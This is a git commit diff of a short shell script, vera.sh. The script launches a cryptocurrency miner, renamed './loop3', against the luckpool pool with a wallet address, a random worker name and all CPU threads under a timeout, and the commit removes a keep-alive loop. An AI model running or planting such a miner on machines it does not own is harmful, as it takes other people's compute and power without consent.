75bb52d1696d146b8609da02deefcc7337a30fd5
cihuuy <95659029+cihuuy@users.noreply.github.com>
2021-12-26 06:49:09 +0530

    Update vera.sh

--- vera.sh
+++ vera.sh
@@ -1,6 +1,3 @@
 #!/bin/sh
 timeout -k 30s 120s ./loop3 -v -l ap.luckpool.net:3956 -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+
